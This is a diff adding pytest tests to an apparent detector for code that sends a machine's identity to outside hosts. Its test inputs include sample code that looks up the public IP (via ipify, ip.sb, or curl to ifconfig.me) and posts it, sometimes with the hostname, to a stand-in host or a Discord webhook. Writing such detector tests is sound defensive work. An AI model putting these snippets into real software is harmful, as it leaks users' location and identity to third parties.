@@ -801,3 +801,70 @@ class TestWhatACallerHandsAClassSentToAHiddenDestination:
         endpoint = "'https://api.example.invalid/' + 'atad'[::-1] + '/'"
         body = "json.dumps({'d': self.day}).encode()"
         assert self.relayed(self.module(endpoint, body)) == []
+
+
+class TestThePublicAddressIsIdentity:
+    """A reply from a public-address lookup is where this machine is, like `gethostname()`."""
+
+    SEND = "def post(b):\n    urllib.request.urlopen(urllib.request.Request('https://c.example/x', data=b))\n"
+
+    def test_a_lookup_reply_posted_is_identity_sent(self):
+        source = (
+            "import urllib.request\n" + self.SEND + "ip = urllib.request.urlopen(\n"
+            "    urllib.request.Request('https://api.ip.sb/ip')).read().decode()\n"
+            "post(ip.encode())\n"
+        )
+        assert Flow.sent(source)
+
+    def test_a_requests_lookup_posted(self):
+        source = (
+            "import requests\nip = requests.get('https://api.ipify.org').text\n"
+            "requests.post('https://c.example/x', json={'ip': ip})\n"
+        )
+        assert Flow.sent(source) == ["identity sent: requests.post"]
+
+    def test_a_lookup_only_printed_sends_nothing(self):
+        source = "import requests\nprint(requests.get('https://api.ipify.org').text)\n"
+        assert Flow.sent(source) == []
+
+    def test_a_curl_lookup_through_a_command_helper(self):
+        source = (
+            "import subprocess, requests\n"
+            "def run(c):\n    return subprocess.run(c, shell=True, capture_output=True).stdout\n"
+            "requests.post('https://c.example/x', data=run('curl -s https://ifconfig.me'))\n"
+        )
+        assert Flow.sent(source)
+
+    def test_an_unrelated_api_response_is_not_identity(self):
+        source = (
+            "import requests\nr = requests.get('https://api.example.com/items')\n"
+            "requests.post('https://api.example.com/log', json=r.json())\n"
+        )
+        assert Flow.sent(source) == []
+
+    def test_a_weather_client_sending_its_lookup_to_its_api_in_a_function_is_not_identity(self):
+        source = (
+            "import requests\n"
+            "def forecast():\n"
+            "    ip = requests.get('https://api.ipify.org').text\n"
+            "    return requests.get('https://api.weather.example/v1', params={'q': ip}).json()\n"
+        )
+        assert Flow.sent(source) == []
+
+    def test_a_lookup_sent_to_a_webhook_from_a_function_is_identity(self):
+        source = (
+            "import requests\n"
+            "def report():\n"
+            "    ip = requests.get('https://api.ipify.org').text\n"
+            "    requests.post('https://discord.com/api/webhooks/1/x', json={'ip': ip})\n"
+        )
+        assert Flow.sent(source)
+
+    def test_a_lookup_sent_with_the_hostname_from_a_function_is_identity(self):
+        source = (
+            "import requests, socket\n"
+            "def report():\n"
+            "    ip = requests.get('https://api.ipify.org').text\n"
+            "    requests.post('https://api.example.com/x', json={'ip': ip, 'h': socket.gethostname()})\n"
+        )
+        assert Flow.sent(source)
